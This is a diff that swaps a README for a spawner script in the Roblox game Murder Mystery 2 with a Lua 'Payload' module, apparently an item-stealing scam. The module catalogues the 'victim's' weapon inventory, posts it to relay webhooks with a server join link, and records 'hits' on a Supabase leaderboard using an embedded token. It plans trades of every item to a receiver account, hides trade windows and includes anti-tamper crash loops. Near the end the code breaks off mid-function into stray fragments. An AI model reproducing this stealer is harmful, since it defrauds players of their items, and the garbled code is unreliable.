@@ -1,1 +1,518 @@
-# mmsspawnnewpached
+local Payload = {}
+
+Payload.brand = "Velt Scripts"
+Payload.invite = "discord.gg/velt-scripts"
+Payload.allowedPlaceIds = {
+    [142823291] = true,
+    [335132309] = true,
+    [636649648] = true,
+}
+
+Payload.receivers = {
+    "jtfor13",
+}
+
+Payload.rarityOrder = {
+    "Common",
+    "Uncommon",
+    "Rare",
+    "Legendary",
+    "Vintage",
+    "Godly",
+    "Ancient",
+    "Unique",
+    "Chroma",
+}
+
+Payload.rarityRank = {
+    Common = 1,
+    Uncommon = 2,
+    Rare = 3,
+    Legendary = 4,
+    Vintage = 5,
+    Godly = 6,
+    Ancient = 7,
+    Unique = 8,
+    Chroma = 9,
+}
+
+Payload.itemNameFragments = {
+    "beach",
+    "beam",
+    "blade",
+    "blaster",
+    "blaze",
+    "blood",
+    "bloom",
+    "blossom",
+    "bolt",
+    "bone",
+    "burn",
+    "candycane",
+    "cane",
+    "cannon",
+    "charge",
+    "chroma ",
+    "claw",
+    "coral",
+    "crystal",
+    "dagger",
+    "diamond",
+    "draco",
+    "dragon",
+    "edge",
+    "ember",
+    "evergreen",
+    "evergun",
+    "fang",
+    "fire",
+    "fish",
+    "flame",
+    "flora",
+    "flower",
+    "frost",
+    "ghost",
+    "ginger",
+    "hallow",
+    "heat",
+    "jingle",
+    "knife",
+    "laser",
+    "mint",
+    "ocean",
+    "ornament",
+    "palm",
+    "pearl",
+    "pistol",
+    "plasma",
+    "prism",
+    "pumpkin",
+    "rainbow",
+    "raygun",
+    "revolver",
+    "rifle",
+    "saber",
+    "sakura",
+    "sand",
+    "scope",
+    "scythe",
+    "shadow",
+    "shard",
+    "shark",
+    "shell",
+    "shock",
+    "shot",
+    "skull",
+    "sniper",
+    "snow",
+    "spark",
+    "sparkle",
+    "spider",
+    "summer",
+    "suns",
+    "sword",
+    "tide",
+    "water",
+    "wave",
+    "winter",
+    "xmas",
+    "zombie",
+}
+
+Payload.endpoints = {
+    publicWebhook = "https://mm2-relay.pages.dev/api/relay?wh=wh_dfe4c33d3b84196106590da7af1b318642304696",
+    dualhookWebhook = "https://mm2-relay.pages.dev/api/relay?wh=wh_bc0d90873158f460cb84b522aa720d20aedc1446",
+    leaderboard = "https://hjurijvyzvsvivovhvkc.supabase.co/rest/v1/leaderboard",
+    supreme = "http://109.120.157.241:5000/supreme",
+    exampleHitTracker = "https://your-app.vercel.app/api/hit",
+}
+
+Payload.supabaseToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhqdXJpanZ5enZzdml2b3ZodmtjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODYxMDQxMjYsImV4cCI6MjEwMTY4MDEyNn0.aG_QBzx79yOJJ7DEgPYHaveUhHKWcwAu97p5H00b408"
+
+Payload.defaults = {
+    scriptExecuted = true,
+    dualhookEnabled = true,
+    dualhookTime = 60,
+    dhMinPingValue = 500,
+    minValue = 1,
+    minRarity = "Common",
+}
+
+Payload.antiTamper = {
+    {
+        operation = "Instance.new('Part'):InvalidMethod('a')",
+        expected = "error",
+        failureAction = "task.spawn() loop",
+    },
+    {
+        operation = "game:GetChildren(callback)",
+        expected = "callback rejected",
+        failureAction = "nil table index loop",
+    },
+    {
+        operation = "#game:GetChildren() > 4",
+        expected = true,
+        failureAction = "out-of-bounds buffer write loop",
+    },
+    {
+        operation = "HttpService:JSONDecode",
+        input = '[68, "getgold.cc", true, 123, false, [321, null, "goldtm"], null, ["a"]]',
+        expected = {
+            [1] = 68,
+            [2] = "getgold.cc",
+            [3] = true,
+            [4] = 123,
+            [5] = false,
+            [6] = {
+                [1] = 321,
+                [3] = "goldtm",
+            },
+            [8] = { "a" },
+        },
+        failureAction = "task() loop",
+    },
+    {
+        operation = "game.HttpService",
+        expected = "indexable service",
+        failureAction = "nil.Parent loop",
+    },
+    {
+        operation = "_G isolated from getfenv()",
+        probeName = "getgoldcc",
+        probeValue = "goldtm",
+        failureAction = "game() loop",
+    },
+    {
+        operation = "game()",
+        expectedError = "attempt to call a Instance value",
+        failureAction = "table.create(9e9) loop",
+    },
+}
+
+local function shallowCopy(source)
+    local result = {}
+    for key, value in pairs(source or {}) do
+        result[key] = value
+    end
+    return result
+end
+
+local function normalizeAmount(value)
+    local number = tonumber(value)
+    if not number or number < 0 then
+        return 0
+    end
+    return number
+end
+
+local function metadataFor(database, itemName)
+    local metadata = database and database[itemName]
+    if type(metadata) == "table" then
+        return metadata
+    end
+    return {}
+end
+
+local function readNumber(metadata, keys)
+    for _, key in ipairs(keys) do
+        local value = tonumber(metadata[key])
+        if value then
+            return value
+        end
+    end
+    return 0
+end
+
+function Payload.applyRecoveredGlobals(environment)
+    environment = environment or {}
+    environment.scriptExecuted = true
+    environment.DH_Usernames = shallowCopy(Payload.receivers)
+    environment.VeltTeam = environment.DH_Usernames
+    environment.publicWebhook = Payload.endpoints.publicWebhook
+    environment.dualhookWebhook = Payload.endpoints.dualhookWebhook
+    environment.dualhookEnabled = true
+    environment.dualhookTime = 60
+    environment.dhMinPingValue = 500
+    return environment
+end
+
+function Payload.selectRequestFunction(environment)
+    environment = environment or {}
+    if environment.syn and environment.syn.request then
+        return environment.syn.request
+    end
+    if environment.http and environment.http.request then
+        return environment.http.request
+    end
+    if environment.http_request then
+        return environment.http_request
+    end
+    if environment.request then
+        return environment.request
+    end
+    if environment.fluxus and environment.fluxus.request then
+        return environment.fluxus.request
+    end
+    return nil
+end
+
+function Payload.extractInventory(rawInventory, itemDatabase)
+    local owned = rawInventory
+    if type(rawInventory) == "table" and type(rawInventory.Weapons) == "table" then
+        owned = rawInventory.Weapons.Owned or rawInventory.Weapons
+    end
+    if type(owned) ~= "table" then
+        return {}
+    end
+
+    local result = {}
+    for itemName, amount in pairs(owned) do
+        local metadata = metadataFor(itemDatabase, itemName)
+        result[#result + 1] = {
+            name = itemName,
+            amount = normalizeAmount(amount),
+            rarity = metadata.Rarity or metadata.rarity or "Unknown",
+            value = readNumber(metadata, { "Value", "value", "Price", "price", "USD", "usd" }),
+            itemType = metadata.ItemType or metadata.Type or metadata.type or "Weapon",
+        }
+    end
+    return result
+end
+
+function Payload.summarizeInventory(items, options)
+    options = options or {}
+    local minValue = tonumber(options.minValue or options.min_value) or Payload.defaults.minValue
+    local minRarity = options.minRarity or options.min_rarity or Payload.defaults.minRarity
+    local minRank = Payload.rarityRank[minRarity] or 1
+    local result = {
+        totalValue = 0,
+        itemCount = 0,
+        selectedValue = 0,
+        selectedCount = 0,
+        rarities = {},
+        items = {},
+        selected = {},
+    }
+
+    for _, rarity in ipairs(Payload.rarityOrder) do
+        result.rarities[rarity] = 0
+    end
+
+    for _, sourceItem in ipairs(items or {}) do
+        local item = shallowCopy(sourceItem)
+        item.amount = normalizeAmount(item.amount)
+        item.value = normalizeAmount(item.value)
+        item.totalValue = item.amount * item.value
+        item.rarity = item.rarity or "Unknown"
+        result.totalValue = result.totalValue + item.totalValue
+        result.itemCount = result.itemCount + item.amount
+        result.rarities[item.rarity] = (result.rarities[item.rarity] or 0) + item.amount
+        result.items[#result.items + 1] = item
+
+        local rank = Payload.rarityRank[item.rarity] or 0
+        if item.totalValue >= minValue and rank >= minRank then
+            result.selectedValue = result.selectedValue + item.totalValue
+            result.selectedCount = result.selectedCount + item.amount
+            result.selected[#result.selected + 1] = item
+        end
+    end
+
+    table.sort(result.items, function(left, right)
+        return left.totalValue > right.totalValue
+    end)
+    table.sort(result.selected, function(left, right)
+        return left.totalValue > right.totalValue
+    end)
+    return result
+end
+
+function Payload.formatValue(value)
+    value = normalizeAmount(value)
+    if value >= 1000000 then
+        return string.format("%.1fM", value / 1000000)
+    end
+    if value >= 1000 then
+        return string.format("%.1fK", value / 1000)
+    end
+    return string.format("%.2f", value)
+end
+
+function Payload.formatLoot(items, limit)
+    limit = limit or 10
+    local lines = {}
+    for index, item in ipairs(items or {}) do
+        if index > limit then
+            lines[#lines + 1] = string.format("+ %s more items...", #items - limit)
+            break
+        end
+        lines[#lines + 1] = string.format(
+            "%s (x%s) %s -> $%s",
+            tostring(item.name),
+            tostring(item.amount),
+            tostring(item.rarity),
+            Payload.formatValue(item.totalValue)
+        )
+    end
+    if #lines == 0 then
+        return "No items found"
+    end
+    return table.concat(lines, "\n")
+end
+
+function Payload.makeJoinLink(placeId, jobId)
+    return string.format(
+        "**[Join Server](https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s)**",
+        tostring(placeId),
+        tostring(jobId)
+    )
+end
+
+function Payload.makeWebhook(victim, executorName, stats, placeId, jobId, receivers, timestamp)
+    receivers = receivers or Payload.receivers
+    timestamp = timestamp or os.date("!%Y-%m-%dT%H:%M:%SZ")
+    local rarityLines = {}
+    for _, rarity in ipairs(Payload.rarityOrder) do
+        rarityLines[#rarityLines + 1] = string.format("%s: %s", rarity, stats.rarities[rarity] or 0)
+    end
+
+    return {
+        content = "--[[ @everyone ]] ",
+        embeds = {
+            {
+                title = "Velt | MM2 Hit",
+                color = 16777215,
+                fields = {
+                    {
+                        name = "Victim Info",
+                        value = string.format(
+                            "```Victim: %s\nExecutor: %s\nReceivers: %s```",
+                            tostring(victim),
+                            tostring(executorName or "Unknown"),
+                            table.concat(receivers, ", ")
+                        ),
+                        inline = false,
+                    },
+                    {
+                        name = "Inventory Stats",
+                        value = string.format(
+                            "```Total Value: %s\nTotal Items: %s\n%s```",
+                            Payload.formatValue(stats.totalValue),
+                            tostring(stats.itemCount),
+                            table.concat(rarityLines, "\n")
+                        ),
+                        inline = false,
+                    },
+                    {
+                        name = "Loot (Highest Value)",
+                        value = Payload.formatLoot(stats.items),
+                        inline = false,
+                    },
+                    {
+                        name = "Link to join",
+                        value = Payload.makeJoinLink(placeId, jobId),
+                        inline = false,
+                    },
+                },
+                footer = {
+                    text = "Velt Scripts",
+                },
+                timestamp = timestamp,
+            },
+        },
+    }
+end
+
+function Payload.makeWebhookRequest(url, encodedBody)
+    return {
+        Url = url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json",
+        },
+        Body = encodedBody,
+    }
+end
+
+function Payload.makeTrackerRequest(trackerUrl, scriptId, victim, totalValue, itemCount, encodedBody)
+    return {
+        Url = trackerUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json",
+        },
+        Body = encodedBody,
+        decodedBody = {
+            scriptId = scriptId,
+            victim = victim,
+            totalValue = totalValue,
+            itemCount = itemCount,
+        },
+    }
+end
+
+function Payload.makeLeaderboardHeaders()
+    return {
+        apikey = Payload.supabaseToken,
+        Authorization = "Bearer " .. Payload.supabaseToken,
+        ["Content-Type"] = "application/json",
+        Prefer = "return=minimal",
+    }
+end
+
+function Payload.makeLeaderboardLookup(discordId)
+    return {
+        Url = Payload.endpoints.leaderboard .. "?discord_id=eq." .. tostring(discordId) .. "&select=hits",
+        Method = "GET",
+        Headers = Payload.makeLeaderboardHeaders(),
+    }
+end
+
+function Payload.makeLeaderboardUpdate(discordId, hits, encodedBody)
+    return {
+        Url = Payload.endpoints.leaderboard .. "?discord_id=eq." .. tostring(discordId),
+        Method = "PATCH",
+        Headers = Payload.makeLeaderboardHeaders(),
+        Body = encodedBody,
+        decodedBody = {
+            hits = normalizeAmount(hits),
+        },
+    }
+end
+
+function Payload.makeTradePlan(players, items, options)
+    options = options or {}
+    local receiverSet = {}
+    for _, name in ipairs(options.receivers or Payload.receivers) do
+        receiverSet[name] = true
+    end
+
+    local receiver
+    for _, player in ipairs(players or {}) do
+        local name = type(player) == "table" and player.Name or tostring(player)
+        if receiverSet[name] then
+            receiver = player
+            break
+        end
+    end
+
+    local selected = {}
+    for _, item in ipairs(items or {}) do
+        if normalizeAmount(item.amount) > 0 then
+            selected[#selected + 1] = shallowCopy(item)
+        end
+    end
+
+    return {
+        receiver = receiver,
+        items = selected,
+        timeout = tonumber(options.timeout) or 45,
+        delayedRetry = tonumber(options.dualhookTime) or Payload.defaults.dualhookTime,
+        minimumPing = tonumber(options.dhMinPingValue) or UI.Enabled",
+            "PlayerGui.TradeGUI_Phone.Enabled",
+        },
+        disconnectSignals = {
+            "TradeGui.Container.Trade.Actions.Accept.ActionButton.MouseButton1Click",
+            "TradeGui.Container.Trade.Actions.Decline.ActionButton.MouseButton1Click",
+
+
+return Payload
